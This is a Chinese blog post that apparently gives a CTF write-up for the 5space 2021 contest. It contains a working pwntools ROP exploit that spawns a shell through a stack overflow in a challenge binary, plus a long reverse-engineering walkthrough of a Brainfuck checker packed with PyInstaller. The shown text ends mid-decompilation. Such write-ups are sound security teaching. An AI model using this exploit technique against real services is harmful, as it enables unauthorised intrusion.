<!DOCTYPE html>
<html>
<head hexo-theme='https://volantis.js.org/#blog'>
  <meta charset="utf-8">
  <!-- SEO相关 -->
  
    
  
  <!-- 渲染优化 -->
  <meta name="renderer" content="webkit">
  <meta name="force-rendering" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  <meta name="HandheldFriendly" content="True" >
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <!-- 页面元数据 -->
  
    <title>wp-5space-2021 - My Tiny Ideas</title>
  
    <meta name="keywords" content="ctf,writeup,5space">
  
  
    <meta name="description" content="第五空间2021，忙完之后终于有时间梳理一下之前做题的思路和复现一下当时没有解出来的题目。">
  

  <!-- feed -->
  

  <!-- import meta -->
  

  <!-- link -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13/css/all.min.css">
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">

  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.css">

  

  
  <link rel="shortcut icon" type='image/x-icon' href="https://cdn.jsdelivr.net/gh/xaoxuu/assets@master/favicon/favicon.ico">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10/dist/APlayer.min.css">
  

  

  <!-- import link -->
  

  
    
      
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.18.1/styles/solarized-light.css">

    
  
  
    
<link rel="stylesheet" href="/css/style.css">

  

  <script>
    function setLoadingBarProgress(num) {
      document.getElementById('loading-bar').style.width=num+"%";
    }
  </script>

  
    <!-- Global site tag (gtag.js) - Google Analytics -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-128484503-1"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'UA-128484503-1');
    </script>
  
  
</head>

<body>
  
  <div id="loading-bar-wrapper">
  <div id="loading-bar"></div>
</div>
<header class="l_header shadow blur">
  <div class='container'>
  <div class='wrapper'>
    <div class='nav-sub'>
      <p class="title"></p>
      <ul class='switcher nav-list-h'>
        <li><a class="s-comment fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
        
          <li><a class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
        
      </ul>
    </div>
		<div class="nav-main">
      
        
        <a class="title flat-box" target="_self" href='/'>
          
          
          
          
            RYCBAR'S <b><sup style='color:#3AA757'>blog</sup></b>
          
        </a>
      

			<div class='menu navigation'>
				<ul class='nav-list-h'>
          
          
          
            
            
              <li>
                <a class="flat-box" href=/
                  
                  
                  
                    id="home"
                  >
                  <i class='fas fa-rss fa-fw'></i>博客
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="flat-box" href=/categories/
                  
                  
                  
                    id="categories"
                  >
                  <i class='fas fa-folder-open fa-fw'></i>分类
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="flat-box" href=/tags/
                  
                  
                  
                    id="tags"
                  >
                  <i class='fas fa-tags fa-fw'></i>标签
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="flat-box" href=/archives/
                  
                  
                  
                    id="archives"
                  >
                  <i class='fas fa-archive fa-fw'></i>归档
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="flat-box" href=/friends/
                  
                  
                  
                    id="friends"
                  >
                  <i class='fas fa-link fa-fw'></i>友链
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="flat-box" href=/about/
                  
                  
                  
                    id="about"
                  >
                  <i class='fas fa-info-circle fa-fw'></i>关于
                </a>
                
              </li>
            
          
          
				</ul>
			</div>

      <div class="m_search">
        <form name="searchform" class="form u-search-form">
          <i class="icon fas fa-search fa-fw"></i>
          <input type="text" class="input u-search-input" placeholder="Search..." />
        </form>
      </div>

			<ul class='switcher nav-list-h'>
				
					<li><a class="s-search fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
				
				<li>
          <a class="s-menu fas fa-bars fa-fw" target="_self" href='javascript:void(0)'></a>
          <ul class="menu-phone list-v navigation white-box">
            
              
            
              <li>
                <a class="flat-box" href=/
                  
                  
                  
                    id="home"
                  >
                  <i class='fas fa-rss fa-fw'></i>博客
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="flat-box" href=/categories/
                  
                  
                  
                    id="categories"
                  >
                  <i class='fas fa-folder-open fa-fw'></i>分类
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="flat-box" href=/tags/
                  
                  
                  
                    id="tags"
                  >
                  <i class='fas fa-tags fa-fw'></i>标签
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="flat-box" href=/archives/
                  
                  
                  
                    id="archives"
                  >
                  <i class='fas fa-archive fa-fw'></i>归档
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="flat-box" href=/friends/
                  
                  
                  
                    id="friends"
                  >
                  <i class='fas fa-link fa-fw'></i>友链
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="flat-box" href=/about/
                  
                  
                  
                    id="about"
                  >
                  <i class='fas fa-info-circle fa-fw'></i>关于
                </a>
                
              </li>
            
          
            
          </ul>
        </li>
			</ul>
		</div>
	</div>
  </div>
</header>

<script>setLoadingBarProgress(40);</script>



  <div class="l_body nocover">
    <div class='body-wrapper'>
      

<div class='l_main'>
  

  
    <article id="post" class="post white-box reveal shadow article-type-post" itemscope itemprop="blogPost">
      


  <section class='meta'>
    
      
      
      <div class="meta" id="header-meta">
        
          
  <h1 class="title">
    <a href="/2021/10/05/wp-5space-2021/">
      wp-5space-2021
    </a>
  </h1>


        
        <div class='new-meta-box'>
          
            
          
            
              
<div class='new-meta-item author'>
  <a href="http://blog.rycbar.club" rel="nofollow">
    <img src="https://q2.qlogo.cn/headimg_dl?dst_uin=595371936&spec=100">
    <p>rycbar</p>
  </a>
</div>

            
          
            
              

            
          
            
              <div class="new-meta-item date">
  <a class='notlink'>
    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
    <p>发布于：2021年10月5日</p>
  </a>
</div>

            
          
            
              

            
          
        </div>
        
          <hr>
        
      </div>
    
  </section>


      <section class="article typo">
        <div class="article-entry" itemprop="articleBody">
          
          <p>第五空间2021，忙完之后终于有时间梳理一下之前做题的思路和复现一下当时没有解出来的题目。</p>
<span id="more"></span>

<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="bountyhunter"><a href="#bountyhunter" class="headerlink" title="bountyhunter"></a>bountyhunter</h3><p>基础栈溢出</p>
<pre><code class="c++">ssize_t vulnerable_function()
&#123;
  char buf[144]; // [rsp+0h] [rbp-90h] BYREF

  system(&quot;echo Who are you? What do you want?&quot;);
  return read(0, buf, 0x200uLL);
&#125;
</code></pre>
<p>存在溢出，程序中包含<code>/bin/sh</code>字符串，rop</p>
<pre><code class="python">from pwn import *

p = process(&#39;./pwn&#39;)
# p = remote(&#39;139.9.123.168&#39;, 32548)
binary = ELF(&#39;./pwn&#39;)


# def debug():
#     log.info(&quot;pid: %d&quot; % util.proc.pidof(p)[0])
#     pause()


# debug()
bin_sh = 0x403408
system = binary.plt.system
log.info(hex(system))
ret = 0x401016
pop_rdi = 0x40120b
payload = b&#39;a&#39;*(0x90+8)+p64(ret) + p64(pop_rdi)+p64(bin_sh)+p64(system)
p.sendline(payload)
p.interactive()
</code></pre>
<h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="StrangeLanguage"><a href="#StrangeLanguage" class="headerlink" title="StrangeLanguage"></a>StrangeLanguage</h3><p>拿到的程序为pyinstaller打包，首先解包</p>
<h4 id="解包"><a href="#解包" class="headerlink" title="解包"></a>解包</h4><p>使用<code>pyinstxtractor</code>解包，其中包含许多编译好的库文件和部分没有后缀的文件，这些没有后缀的文件实际上时pyc文件，可以反编译得到python代码，但是需要解决一个问题，解包时没法确定python版本，这些pyc文件是没有文件头的，因此第一步是需要补上对应python版本的文件头。</p>
<p>比较简单的方法是找到<code>base_library.zip</code>这个压缩文件，一般解包出来都会有，里面包含许多pyc文件，从这里复制文件头可以匹配python版本，然后可以用uncompyle6反编译。</p>
<pre><code class="python"># uncompyle6 version 3.7.4
# Python bytecode 3.8 (3413)
# Decompiled from: Python 3.8.10 (default, Jun  2 2021, 10:49:15) 
# [GCC 9.4.0]
# Embedded file name: main.py
# Compiled at: 2083-07-26 15:12:22
# Size of source mod 2**32: 1703593186 bytes
import brainfuck
brainfuck.main_check()
</code></pre>
<p>python文件里并没有太多内容，调用了brainfuck库，主要的内容都在编译好的<code>brainfuck.cp38-win_amd64.pyd</code>中实现。</p>
<h4 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h4><p>pyd文件使用ida反编译，可以发现是一个brainfuck的解释器，读取一段指令然后执行，指令很多就不放了，方法是将指令转换为C语言，对应的关系为</p>
<pre><code class="python">dic = &#123;&#39;&gt;&#39;: &#39;++ptr;&#39;,
       &#39;&lt;&#39;: &#39;--ptr;&#39;,
       &#39;+&#39;: &#39;++*ptr;&#39;,
       &#39;-&#39;: &#39;--*ptr;&#39;,
       &#39;.&#39;:    &#39;putchar(*ptr);&#39;,
       &#39;,&#39;:    &#39;*ptr = getchar();&#39;,
       &#39;[&#39;: &#39;while (*ptr) &#123;&#39;,
       &#39;]&#39;:    &#39;&#125;&#39;&#125;
</code></pre>
<p>转换为C语言之后的代码大体为</p>
<pre><code class="c">#include &lt;stdio.h&gt;

int main()
&#123;
    char *ptr = (char *)malloc(1000);
    ++ptr;
    ++ptr;
    ++ptr;
   ......
        --ptr;
        putchar(*ptr);
        ++*ptr;
        putchar(*ptr);
        --*ptr;
        putchar(*ptr);
        ++*ptr;
        putchar(*ptr);
        --*ptr;
        putchar(*ptr);
        ++*ptr;
        putchar(*ptr);
        --ptr;
        --ptr;
        while (*ptr)
        &#123;
            --*ptr;
        &#125;
    &#125;
   ......
    --ptr;
    --ptr;
    --ptr;
    --ptr;
    --ptr;
    --ptr;
    --ptr;
    --ptr;
&#125;
</code></pre>
<p>指令太多不好分析，此时借助编译器的优化，合并和去除无用的指令，然后进行反编译更容易梳理代码的逻辑，直接使用<code>-O3</code>标志进行最大程度的优化。</p>
<p>此时反编译出来的结果更易读，可调试，容易分析出代码的执行逻辑</p>
<pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp)
&#123;
  ......
  base = (char *)malloc(0x3E8uLL);
  if ( base[1] )
    base[1] = 0;
  v4 = base[47] == 0;
  base[41] = 1;
  base[43] = 0;
  if ( !v4 )
    base[47] = 0;
  base[46] = 0;
  *((_WORD *)base + 22) = 1;
  v4 = base[45] == 0;
  base[44] = 0;
  if ( !v4 )
    base[45] = 0;
  v5 = base[41];
  if ( v5 )
  &#123;
    base[44] += v5;
    base[45] += v5;
    base[41] = 0;
  &#125;
  v6 = base[45];
  if ( v6 )
  &#123;
    base[41] += v6;
    base[45] = 0;
  &#125;
  if ( base[44] )
  &#123;
    ++base[43];
    base[44] = 0;
  &#125;
  v7 = base + 43;
  if ( !base[43] )
  &#123;
    v110 = base[47];
    v111 = base[46];
    if ( base[44] )
      base[44] = 0;
    if ( v111 )
      base[46] = 0;
    if ( v110 )
      base[47] = 0;
    goto LABEL_62;
  &#125;
  v8 = base[47];
  v9 = base + 44;
  v10 = base[46];
  if ( base[44] )
    base[44] = 0;
  while ( 2 )
  &#123;
    v11 = getc(stdin);
    v7[1] = v11;
    *v7 = 0;
    if ( !v11 )
    &#123;
      v12 = v7 + 2;
      v13 = 0;
LABEL_18:
      v14 = *(v7 - 42);
      *(_WORD *)(v7 + 1) = 0;
      if ( v14 )
        goto LABEL_19;
      goto LABEL_231;
    &#125;
    *v7 = v11;
    v12 = v7 + 2;
    v7[2] = v11;
    v7[1] = 0;
    v13 = v11;
    v7[2] = 10 - v11;
    if ( v11 != 10 )
      goto LABEL_18;
    if ( v10 )
      v7[3] = 0;
    if ( v8 )
      v7[4] = 0;
    if ( *(v7 - 2) )
      *(v7 - 2) = 0;
    v14 = *(v7 - 42);
    v10 = v7[3];
    v7[1] = 0;
    v8 = v7[4];
    if ( v14 )
    &#123;
LABEL_19:
      v15 = v14 + 1;
      *(v7 - 42) = 0;
      v7[1] = v14;
      v7[2] = v14 + 1;
      if ( v14 == -1 )
        goto LABEL_21;
      goto LABEL_20;
    &#125;
LABEL_231:
    v15 = 1;
LABEL_20:
    *(v7 - 42) = v15;
    v7[2] = 0;
LABEL_21:
    if ( v10 )
      v7[3] = 0;
    if ( !v8 )
    &#123;
      if ( !v13 )
        goto LABEL_26;
      goto LABEL_25;
    &#125;
    v7[4] = 0;
    if ( v13 )
    &#123;
LABEL_25:
      v7[3] = v13;
      *v7 = v13;
      v7[4] = 0;
    &#125;
LABEL_26:
    if ( v14 )
    &#123;
      while ( 1 )
      &#123;
        if ( v13 )
        &#123;
          v9[2] = 0;
          v9[3] = v13;
        &#125;
        v19 = v9[1];
        v14 = v19 + 1;
        v9[1] = v19 + 1;
        if ( v19 != -1 )
        &#123;
          v9[1] = 0;
          v9[2] = v14;
        &#125;
        v20 = *v9;
        v21 = *v9 - 1;
        *v9 = v21;
        if ( v20 == 1 )
          break;
        v16 = v21 - v20;
        v17 = v20 - 1;
        v18 = v9[4];
        v9[1] = v17;
        *v9 = v16 + 1;
        v109 = v9 + 2;
        if ( !v17 )
          goto LABEL_38;
        if ( v18 )
          v12[3] = 0;
        v9 = v12;
        v12 = v109;
      &#125;
      v18 = v9[4];
      v109 = v9 + 2;
LABEL_38:
      if ( v18 )
        v12[3] = 0;
    &#125;
    else
    &#123;
      v109 = v12;
      v12 = v9;
    &#125;
    if ( *(v12 - 42) )
      *(v12 - 42) = 0;
    if ( v13 )
    &#123;
      *(v12 - 42) = v13;
      *v12 = v13;
      *((_WORD *)v12 + 1) = 0;
    &#125;
    if ( !v14 )
      goto LABEL_48;
    while ( v13 )
    &#123;
      v22 = *v109;
      v13 += *(v109 - 2);
      *(v109 - 1) = 0;
      *(v109 - 2) = v13;
      v23 = v22 - 1;
      *v109 = v22 - 1;
      if ( v22 == 1 )
        goto LABEL_284;
LABEL_47:
      *--v109 = v22 - 1;
      v109[1] = v23 - v22 + 1;
    &#125;
    v22 = *v109;
    v13 = *(v109 - 2);
    v23 = *v109 - 1;
    *v109 = v23;
    if ( v22 != 1 )
      goto LABEL_47;
LABEL_284:
    --v109;
LABEL_48:
    if ( *(v109 - 2) )
      *(v109 - 2) = 0;
    if ( v13 )
      *(v109 - 1) = 0;
    v24 = *(v109 - 44);
    if ( v24 )
      *(v109 - 1) = v24;
    v4 = v109[2] == 0;
    *(_WORD *)v109 = 38;
    if ( !v4 )
      v109[2] = 0;
    v25 = 38;
    while ( v24 )
    &#123;
      *(v109 - 1) = 0;
      v109[2] = v24;
      *(v109 - 1) = v24--;
      v109[2] = 0;
      *(v109 - 1) = v24;
      if ( !--v25 )
      &#123;
        *(_WORD *)v109 = 0;
        if ( v24 )
          *(v109 - 1) = 0;
        goto LABEL_61;
      &#125;
    &#125;
    do
      --v25;
    while ( v25 );
    v4 = *(v109 - 4) == 0;
    *(_WORD *)v109 = 256;
    *(v109 - 1) = 0;
    v109[1] = 0;
    if ( !v4 )
    &#123;
      *v109 = 0;
      v7 = v109 - 2;
      v10 = 0;
      *(v109 - 2) = 1;
      v9 = v109 - 1;
      v8 = 0;
      continue;
    &#125;
    break;
  &#125;
LABEL_61:
  v7 = v109 - 2;
LABEL_62:
  if ( v7[5] )
    v7[5] = 0;
  if ( v7[6] )
    v7[6] = 0;
  if ( v7[7] )
    v7[7] = 0;
  if ( v7[8] )
  &#123;
    v26 = *(v7 - 41);
    v7[8] = 0;
    if ( v26 )
      goto LABEL_70;
LABEL_303:
    v27 = v7 + 6;
    if ( v7[7] )
    &#123;
      v28 = v7 + 5;
      *v27 = &#39;f&#39;;
    &#125;
    else
    &#123;
      *((_WORD *)v7 + 3) = 102;
      v28 = v7 + 5;
    &#125;
    goto LABEL_71;
  &#125;
  v26 = *(v7 - 41);
  if ( !v26 )
    goto LABEL_303;
LABEL_70:
  *(v7 - 41) = v26;
  v27 = v7 + 6;
  *(_WORD *)(v7 + 7) = 0;
  v28 = v7 + 5;
  *v28 = v26;
  *(_WORD *)(v28 + 1) = &#39;f&#39;;
  *((_BYTE *)v27 - 1) = 0;
  *(_BYTE *)v27 = 102 - v26;
  if ( v26 != 102 )
  &#123;
LABEL_71:
    *((_BYTE *)v27 - 1) = 0;
    *(_BYTE *)v27 = 0;
    goto LABEL_72;
  &#125;
  *((_BYTE *)v27 - 1) = 1;
  v4 = v28[1] == 0;
  *v28 = 1;
  if ( !v4 )
    v28[1] = 0;
  v101 = 0;
  while ( 2 )
  &#123;
    v28[2] = 1;
    v102 = v28++;
    if ( v101 )
    &#123;
      v103 = *(v28 - 1);
      ++v101;
      *v28 = 0;
      v28[1] = v101;
      v104 = v103 - 1;
      *(v28 - 1) = v103 - 1;
      if ( v103 == 1 )
        break;
      goto LABEL_235;
    &#125;
    v103 = *(v28 - 1);
    v101 = 1;
    v104 = v103 - 1;
    *(v28 - 1) = v103 - 1;
    if ( v103 != 1 )
    &#123;
LABEL_235:
      *v28 = v103 - 1;
      *(v28 - 1) = v104 - v103 + 1;
      continue;
    &#125;
    break;
  &#125;
  if ( v102[3] )
    v102[3] = 0;
  if ( v102[4] )
  &#123;
    v105 = *(v102 - 45);
    v102[4] = 0;
    if ( v105 )
      goto LABEL_242;
LABEL_286:
    v105 = 0;
  &#125;
  else
  &#123;
    v105 = *(v102 - 45);
    if ( !v105 )
      goto LABEL_286;
LABEL_242:
    *(v102 - 45) = v105;
    v102[1] = v105;
    *(_WORD *)(v102 + 3) = 0;
  &#125;
  v27 = v102 + 2;
  if ( v101 )
  &#123;
    while ( 1 )
    &#123;
      if ( v105 )
      &#123;
        v106 = *(_BYTE *)v27;
        v105 += *((_BYTE *)v27 - 2);
        *((_BYTE *)v27 - 1) = 0;
        *((_BYTE *)v27 - 2) = v105;
        v107 = v106 - 1;
        *(_BYTE *)v27 = v106 - 1;
        if ( v106 == 1 )
          goto LABEL_282;
      &#125;
      else
      &#123;
        v106 = *(_BYTE *)v27;
        v105 = *((_BYTE *)v27 - 2);
        v107 = *(_BYTE *)v27 - 1;
        *(_BYTE *)v27 = v107;
        if ( v106 == 1 )
        &#123;
LABEL_282:
          v28 = v27 - 1;
          v27 = (_WORD *)((char *)v27 - 1);
          break;
        &#125;
      &#125;
      *((_BYTE *)v27 - 1) = v106 - 1;
      *(_BYTE *)v27 = v107 - v106 + 1;
      v27 = (_WORD *)((char *)v27 - 1);
    &#125;
  &#125;
  *v27 = &#39;l&#39;;
  if ( !v105 )
    goto LABEL_71;
  *(_BYTE *)v27 = 108 - v105;
  if ( v105 != 108 )
    goto LABEL_71;
  ++*((_BYTE *)v27 - 2);
  *((_BYTE *)v27 - 1) = 0;
LABEL_72:
  v29 = v28 - 1;
  if ( !*(v28 - 1) )
    goto LABEL_94;
  v4 = *v28 == 0;
  *(v28 - 1) = 2;
  if ( !v4 )
    *v28 = 0;
  v30 = 0;
  while ( 2 )
  &#123;
    v29[2] = 1;
    v31 = v29++;
    if ( v30 )
    &#123;
      v32 = *(v29 - 1);
      ++v30;
      *v29 = 0;
      v29[1] = v30;
      v33 = v32 - 1;
      *(v29 - 1) = v32 - 1;
      if ( v32 == 1 )
        break;
      goto LABEL_76;
    &#125;
    v32 = *(v29 - 1);
    v30 = 1;
    v33 = v32 - 1;
    *(v29 - 1) = v32 - 1;
    if ( v32 != 1 )
    &#123;
LABEL_76:
      *v29 = v32 - 1;
      *(v29 - 1) = v33 - v32 + 1;
      continue;
    &#125;
    break;
  &#125;
  if ( v31[3] )
    v31[3] = 0;
  if ( v31[4] )
  &#123;
    v34 = *(v31 - 44);
    v31[4] = 0;
    if ( v34 )
      goto LABEL_83;
LABEL_295:
    v34 = 0;
  &#125;
  else
  &#123;
    v34 = *(v31 - 44);
    if ( !v34 )
      goto LABEL_295;
LABEL_83:
    *(v31 - 44) = v34;
    v31[1] = v34;
    *(_WORD *)(v31 + 3) = 0;
  &#125;
  v35 = v31 + 2;
  if ( !v30 )
    goto LABEL_91;
  while ( 2 )
  &#123;
    if ( v34 )
    &#123;
      v36 = *v35;
      v34 += *(v35 - 2);
      *(v35 - 1) = 0;
      *(v35 - 2) = v34;
      v37 = v36 - 1;
      *v35 = v36 - 1;
      if ( v36 == 1 )
        break;
      goto LABEL_89;
    &#125;
    v36 = *v35;
    v34 = *(v35 - 2);
    v37 = *v35 - 1;
    *v35 = v37;
    if ( v36 != 1 )
    &#123;
LABEL_89:
      v38 = v37 - v36;
      v39 = v36 - 1;
      v40 = v35 - 1;
      *(v35 - 1) = v39;
      *v35 = v38 + 1;
      if ( !v39 )
        goto LABEL_90;
      --v35;
      continue;
    &#125;
    break;
  &#125;
  v40 = v35 - 1;
LABEL_90:
  v29 = v35 - 2;
  v35 = v40;
LABEL_91:
  *(_WORD *)v35 = 97;
  if ( v34 &amp;&amp; (*v35 = &#39;a&#39; - v34, v34 == &#39;a&#39;) )
  &#123;
    ++*(v35 - 2);
    *(v35 - 1) = 0;
  &#125;
  else
  &#123;
    *(v35 - 1) = 0;
    *v35 = 0;
  &#125;
LABEL_94:
  v41 = v29 - 1;
  if ( !*(v29 - 1) )
    goto LABEL_113;
  v4 = *v29 == 0;
  *(v29 - 1) = 3;
  if ( !v4 )
    *v29 = 0;
  v42 = 0;
  while ( 2 )
  &#123;
    v41[2] = 1;
    v43 = v41++;
    if ( v42 )
    &#123;
      v44 = *(v41 - 1);
      ++v42;
      *v41 = 0;
      v41[1] = v42;
      v45 = v44 - 1;
      *(v41 - 1) = v44 - 1;
      if ( v44 == 1 )
        break;
      goto LABEL_98;
    &#125;
    v44 = *(v41 - 1);
    v42 = 1;
    v45 = v44 - 1;
    *(v41 - 1) = v44 - 1;
    if ( v44 != 1 )
    &#123;
LABEL_98:
      *v41 = v44 - 1;
      *(v41 - 1) = v45 - v44 + 1;
      continue;
    &#125;
    break;
  &#125;
  if ( v43[3] )
    v43[3] = 0;
  if ( v43[4] )
  &#123;
    v46 = *(v43 - 43);
    v43[4] = 0;
    if ( v46 )
      goto LABEL_105;
LABEL_293:
    v46 = 0;
  &#125;
  else
  &#123;
    v46 = *(v43 - 43);
    if ( !v46 )
      goto LABEL_293;
LABEL_105:
    *(v43 - 43) = v46;
    v43[1] = v46;
    *(_WORD *)(v43 + 3) = 0;
  &#125;
  v47 = v43 + 2;
  if ( !v42 )
    goto LABEL_110;
  while ( 2 )
  &#123;
    if ( v46 )
    &#123;
      v48 = *v47;
      v46 += *(v47 - 2);
      *(v47 - 1) = 0;
      *(v47 - 2) = v46;
      v49 = v48 - 1;
      *v47 = v48 - 1;
      if ( v48 == 1 )
        break;
      goto LABEL_109;
    &#125;
    v48 = *v47;
    v46 = *(v47 - 2);
    v49 = *v47 - 1;
    *v47 = v49;
    if ( v48 != 1 )
    &#123;
LABEL_109:
      *(v47 - 1) = v48 - 1;
      *v47-- = v49 - v48 + 1;
      continue;
    &#125;
    break;
  &#125;
  v41 = v47 - 2;
  --v47;
LABEL_110:
  *(_WORD *)v47 = 103;
  if ( v46 &amp;&amp; (*v47 = &#39;g&#39; - v46, v46 == &#39;g&#39;) )
  &#123;
    ++*(v47 - 2);
    *(v47 - 1) = 0;
  &#125;
  else
  &#123;
    *(v47 - 1) = 0;
    *v47 = 0;
  &#125;
LABEL_113:
  v50 = v41 - 1;
  if ( !*(v41 - 1) )
    goto LABEL_133;
  *(v41 - 1) = 4;
  v51 = 0;
  while ( 2 )
  &#123;
    v50[2] = 1;
    v52 = v50++;
    if ( v51 )
    &#123;
      v53 = *(v50 - 1);
      ++v51;
      *v50 = 0;
      v50[1] = v51;
      v54 = v53 - 1;
      *(v50 - 1) = v53 - 1;
      if ( v53 == 1 )
        break;
      goto LABEL_115;
    &#125;
    v53 = *(v50 - 1);
    v51 = 1;
    v54 = v53 - 1;
    *(v50 - 1) = v53 - 1;
    if ( v53 != 1 )
    &#123;
LABEL_115:
      *v50 = v53 - 1;
      *(v50 - 1) = v54 - v53 + 1;
      continue;
    &#125;
    break;
  &#125;
  if ( v52[3] )
    v52[3] = 0;
  if ( v52[4] )
  &#123;
    v55 = *(v52 - 42);
    v52[4] = 0;
    if ( v55 )
      goto LABEL_122;
LABEL_291:
    v55 = 0;
  &#125;
  else
  &#123;
    v55 = *(v52 - 42);
    if ( !v55 )
      goto LABEL_291;
LABEL_122:
    *(v52 - 42) = v55;
    v52[1] = v55;
    *(_WORD *)(v52 + 3) = 0;
  &#125;
  v56 = v52 + 2;
  if ( !v51 )
    goto LABEL_130;
  while ( 2 )
  &#123;
    if ( v55 )
    &#123;
      v57 = *v56;
      v55 += *(v56 - 2);
      *(v56 - 1) = 0;
      *(v56 - 2) = v55;
      v58 = v57 - 1;
      *v56 = v57 - 1;
      if ( v57 == 1 )
        break;
      goto LABEL_128;
    &#125;
    v57 = *v56;
    v55 = *(v56 - 2);
    v58 = *v56 - 1;
    *v56 = v58;
    if ( v57 != 1 )
    &#123;
LABEL_128:
      v59 = v58 - v57;
      v60 = v57 - 1;
      v61 = v56 - 1;
      *(v56 - 1) = v60;
      *v56 = v59 + 1;
      if ( !v60 )
        goto LABEL_129;
      --v56;
      continue;
    &#125;
    break;
  &#125;
  v61 = v56 - 1;
LABEL_129:
  v50 = v56 - 2;
  v56 = v61;
LABEL_130:
  *(_WORD *)v56 = 123;
  if ( v55 &amp;&amp; (*v56 = &#39;&#123;&#39; - v55, v55 == &#39;&#123;&#39;) )
  &#123;
    ++*(v56 - 2);
    *(v56 - 1) = 0;
  &#125;
  else
  &#123;
    *(v56 - 1) = 0;
    *v56 = 0;
  &#125;
LABEL_133:
  v62 = v50 - 1;
  if ( !*(v50 - 1) )
    goto LABEL_150;
  *v50 = 0;
  v63 = 0;
  *(v50 - 1) = 37;
  while ( 2 )
  &#123;
    v62[2] = 1;
    v64 = v62++;
    if ( v63 )
    &#123;
      v65 = *(v62 - 1);
      ++v63;
      *v62 = 0;
      v62[1] = v63;
      v66 = v65 - 1;
      *(v62 - 1) = v65 - 1;
      if ( v65 == 1 )
        break;
      goto LABEL_135;
    &#125;
    v65 = *(v62 - 1);
    v63 = 1;
    v66 = v65 - 1;
    *(v62 - 1) = v65 - 1;
    if ( v65 != 1 )
    &#123;
LABEL_135:
      *v62 = v65 - 1;
      *(v62 - 1) = v66 - v65 + 1;
      continue;
    &#125;
    break;
  &#125;
  if ( v64[3] )
    v62[2] = 0;
  if ( v62[3] )
  &#123;
    v67 = *(v62 - 42);
    v62[3] = 0;
    if ( v67 )
      goto LABEL_142;
LABEL_289:
    v67 = 0;
  &#125;
  else
  &#123;
    v67 = *(v62 - 42);
    if ( !v67 )
      goto LABEL_289;
LABEL_142:
    *(v62 - 42) = v67;
    *v62 = v67;
    *((_WORD *)v62 + 1) = 0;
  &#125;
  v68 = v62 + 1;
  if ( !v63 )
    goto LABEL_147;
  while ( 2 )
  &#123;
    if ( v67 )
    &#123;
      v69 = *v68;
      v67 += *(v68 - 2);
      *(v68 - 1) = 0;
      *(v68 - 2) = v67;
      v70 = v69 - 1;
      *v68 = v69 - 1;
      if ( v69 == 1 )
        break;
      goto LABEL_146;
    &#125;
    v69 = *v68;
    v67 = *(v68 - 2);
    v70 = *v68 - 1;
    *v68 = v70;
    if ( v69 != 1 )
    &#123;
LABEL_146:
      *--v68 = v69 - 1;
      v68[1] = v70 - v69 + 1;
      continue;
    &#125;
    break;
  &#125;
  --v68;
LABEL_147:
  v62 = v68 - 1;
  *(_WORD *)v68 = 125;
  if ( v67 &amp;&amp; (*v68 = &#39;&#125;&#39; - v67, v67 == &#39;&#125;&#39;) )
  &#123;
    ++*(v68 - 2);
    *(v68 - 1) = 0;
  &#125;
  else
  &#123;
    *(v68 - 1) = 0;
    *v68 = 0;
  &#125;
LABEL_150:
  if ( *(v62 - 2) )
    *(v62 - 2) = 0;
  v71 = *(v62 - 1);
  if ( v71 )
  &#123;
    *(v62 - 2) = v71;
    *(v62 - 1) = 0;
  &#125;
  v4 = *(v62 - 3) == 0;
  *v62 = 1;
  if ( v4 || (v4 = *(v62 - 2) == 0, v62[2] = 0, *v62 = 0, v4) )
  &#123;
    putc(&#39;n&#39;, _bss_start);
    putc(&#39;o&#39;, _bss_start);
    putc(&#39;n&#39;, _bss_start);
    putc(&#39;o&#39;, _bss_start);
    putc(&#39;n&#39;, _bss_start);
    putc(&#39;o&#39;, _bss_start);
    return 0;
  &#125;
  *(_WORD *)v62 = 1;
  while ( 2 )
  &#123;
    v4 = v62[9] == 0;
    *(v62 - 3) = 1;
    v72 = v62 + 33;
    *(_QWORD *)(v62 + 1) = 0x2035550545A0F53LL;
    if ( !v4 )
      v62[9] = 0;
    v4 = v62[16] == 0;
    *(_DWORD *)(v62 + 10) = 0x7075607;
    *((_WORD *)v62 + 7) = 0x95B;
    if ( !v4 )
      v62[16] = 0;
    v4 = v62[36] == 0;
    *(v62 - 4) = 5;
    *(_QWORD *)(v62 + 17) = 0x51505C5D03020550LL;
    *(_QWORD *)(v62 + 25) = 0x340757025F5A5452LL;
    *(_WORD *)(v62 + 33) = 0x2405;
    v62[35] = 0;
    if ( !v4 )
      v62[36] = 0;
    v73 = 5;
    v74 = 36;
    while ( v73 )
    &#123;
      v62[33] = 0;
      v62[36] = v73;
      v62[33] = v73--;
      v62[36] = 0;
      v62[33] = v73;
      if ( !--v74 )
      &#123;
